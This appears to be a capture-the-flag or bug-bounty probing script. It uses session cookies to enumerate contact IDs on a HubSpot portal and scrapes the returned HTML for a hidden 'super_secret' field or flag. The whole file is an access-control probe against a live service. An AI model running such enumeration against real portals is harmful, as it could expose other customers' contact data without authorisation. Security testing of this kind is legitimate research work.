#!/usr/bin/env python3
"""
HTML Data Extraction from app.hubspot.com
Extracts contact data embedded in HTML/JavaScript
"""

import requests
import json
import os
import urllib3
import re
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')

print("="*80)
print("HTML Data Extraction from Contact Pages")
print("="*80)

findings = []

# ============================================================================
# EXTRACT DATA FROM HTML
# ============================================================================

def extract_from_html(html_content, contact_id):
    """Extract contact data from HTML page"""

    print(f"\n[*] Analyzing HTML for contact {contact_id}...")
    print(f"  HTML length: {len(html_content)} bytes")

    # Pattern 1: Look for JSON data in script tags
    # React apps often have data like: window.__INITIAL_DATA__ = {...}
    patterns = [
        r'window\.__INITIAL_DATA__\s*=\s*({.*?});',
        r'window\.__data\s*=\s*({.*?});',
        r'window\.INITIAL_STATE\s*=\s*({.*?});',
        r'window\.APP_STATE\s*=\s*({.*?});',
        r'var\s+initialData\s*=\s*({.*?});',
        r'const\s+data\s*=\s*({.*?});',
        r'__APOLLO_STATE__\s*=\s*({.*?});',
    ]

    for pattern in patterns:
        matches = re.findall(pattern, html_content, re.DOTALL)
        if matches:
            for match in matches:
                try:
                    # Try to parse as JSON
                    data = json.loads(match)
                    print(f"  Found JSON data via pattern: {pattern[:40]}")

                    # Search recursively for super_secret
                    def search_dict(d, path=""):
                        if isinstance(d, dict):
                            for k, v in d.items():
                                if 'super_secret' in str(k).lower() or 'supersecret' in str(k).lower():
                                    print(f"  *** FOUND super_secret at {path}.{k}: {v} ***")
                                    findings.append({
                                        'contact_id': contact_id,
                                        'location': f'{path}.{k}',
                                        'value': v,
                                        'full_data': d
                                    })
                                search_dict(v, f"{path}.{k}")
                        elif isinstance(d, list):
                            for i, item in enumerate(d):
                                search_dict(item, f"{path}[{i}]")

                    search_dict(data)

                except:
                    pass

    # Pattern 2: Look for property definitions
    # HubSpot might have: "properties": {...}
    prop_patterns = [
        r'"properties"\s*:\s*{([^}]+)}',
        r"'properties'\s*:\s*{([^}]+)}",
        r'properties:\s*{([^}]+)}',
    ]

    for pattern in prop_patterns:
        matches = re.findall(pattern, html_content)
        if matches:
            for match in matches:
                if 'super_secret' in match.lower():
                    print(f"  *** Found 'super_secret' in properties block ***")
                    print(f"  Content: {match[:500]}")

                    # Try to extract the value
                    value_match = re.search(r'super_secret["\']?\s*[:=]\s*["\']?([^"\'<>,\s}]+)', match, re.I)
                    if value_match:
                        value = value_match.group(1)
                        print(f"  *** Value: {value} ***")
                        findings.append({
                            'contact_id': contact_id,
                            'location': 'properties block',
                            'value': value
                        })

    # Pattern 3: Direct text search for super_secret
    if 'super_secret' in html_content.lower():
        print(f"  Text 'super_secret' found in HTML")

        # Find all occurrences with context
        for match in re.finditer(r'.{0,100}super_secret.{0,100}', html_content, re.I):
            context = match.group(0)
            print(f"  Context: {context[:200]}")

            # Try to extract value
            value_patterns = [
                r'super_secret["\']?\s*[:=]\s*["\']([^"\'<>]+)["\']',
                r'super_secret["\']?\s*[:=]\s*([^,}\s]+)',
            ]

            for vp in value_patterns:
                vm = re.search(vp, context, re.I)
                if vm:
                    value = vm.group(1)
                    print(f"  *** Potential value: {value} ***")
                    findings.append({
                        'contact_id': contact_id,
                        'location': 'text search',
                        'value': value,
                        'context': context[:200]
                    })

    # Pattern 4: Look for firstname to confirm contact data is present
    if 'firstname' in html_content.lower():
        print(f"  'firstname' found - contact data is in page")

        # Extract firstname value
        firstname_match = re.search(r'firstname["\']?\s*[:=]\s*["\']([^"\'<>]+)["\']', html_content, re.I)
        if firstname_match:
            print(f"  Firstname: {firstname_match.group(1)}")

    return findings


# ============================================================================
# FETCH AND ANALYZE CONTACT PAGES
# ============================================================================

headers = {
    'Cookie': SESSION_COOKIES,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
}

# Test multiple contact IDs
contact_ids = [1, 2, 3, 5, 10, 100, 1000, 10000]

for cid in contact_ids:
    url = f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{cid}'

    try:
        print(f"\n{'='*80}")
        print(f"Fetching contact {cid} from {url}")
        print(f"{'='*80}")

        r = requests.get(url, headers=headers, verify=False, timeout=15)

        print(f"Status: {r.status_code}")
        print(f"Content-Type: {r.headers.get('content-type', 'unknown')}")
        print(f"Content-Length: {len(r.text)}")

        if r.status_code == 200:
            extract_from_html(r.text, cid)

            # Save HTML for manual inspection
            with open(f'/home/user/Hub/findings/contact_{cid}_page.html', 'w') as f:
                f.write(r.text)
            print(f"  Saved HTML to: findings/contact_{cid}_page.html")

        elif r.status_code == 403:
            print(f"  403 Forbidden - No access to this contact")
        elif r.status_code == 404:
            print(f"  404 Not Found - Contact doesn't exist")

    except Exception as e:
        print(f"  Error: {str(e)[:100]}")

# ============================================================================
# SUMMARY
# ============================================================================

print("\n" + "="*80)
print(f"HTML Data Extraction Complete")
print(f"Findings: {len(findings)}")
print("="*80)

if findings:
    print("\n*** EXTRACTED DATA ***\n")

    for i, finding in enumerate(findings, 1):
        print(f"{i}. Contact {finding['contact_id']}")
        print(f"   Location: {finding['location']}")
        print(f"   Value: {finding.get('value', 'N/A')}")
        if 'context' in finding:
            print(f"   Context: {finding['context'][:150]}")
        print()

    with open('/home/user/Hub/findings/html_extraction_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    print("Saved to: findings/html_extraction_findings.json")

    # Check if we found the flag
    for finding in findings:
        if finding.get('value') and 'flag' in str(finding.get('value')).lower():
            print("\n" + "="*80)
            print("*** POTENTIAL FLAG FOUND ***")
            print("="*80)
            print(f"Contact: {finding['contact_id']}")
            print(f"Value: {finding['value']}")
            print("="*80)

else:
    print("\nNo super_secret data found in HTML.")
    print("\nPossible reasons:")
    print("  1. Contact data is loaded via AJAX after page load")
    print("  2. Data is in a separate API call")
    print("  3. HTML pages don't contain sensitive properties")
    print("  4. Need to authenticate differently")

    print("\nNext steps:")
    print("  1. Check saved HTML files manually")
    print("  2. Monitor network traffic in browser")
    print("  3. Look for AJAX API calls")
